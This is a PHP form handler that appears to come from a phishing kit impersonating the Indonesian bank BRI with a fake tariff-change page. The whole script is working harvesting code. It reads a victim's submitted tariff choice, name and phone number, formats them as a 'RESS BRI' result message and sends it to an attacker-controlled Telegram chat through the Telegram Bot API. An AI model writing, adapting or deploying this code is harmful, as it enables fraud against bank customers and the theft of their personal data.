<?php
include "../telegram.php";
session_start();
$tarif = $_POST['tarif'];
$nohp = $_POST['nohp'];
$nama = $_POST['nama'];

$_SESSION['nama'] = $nama;
$_SESSION['tarif'] = $tarif;
$_SESSION['nohp'] = $nohp;

$message = "
✧━━━━━━[ BRI TARIP ]━━━━━━✧
RESS BRI ( ".$tarif." )

• tarif : ".$tarif."
• nama : ".$nama."
• no hp : ".$nohp."
";

function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($telegram_id, $message, $id_bot);
?>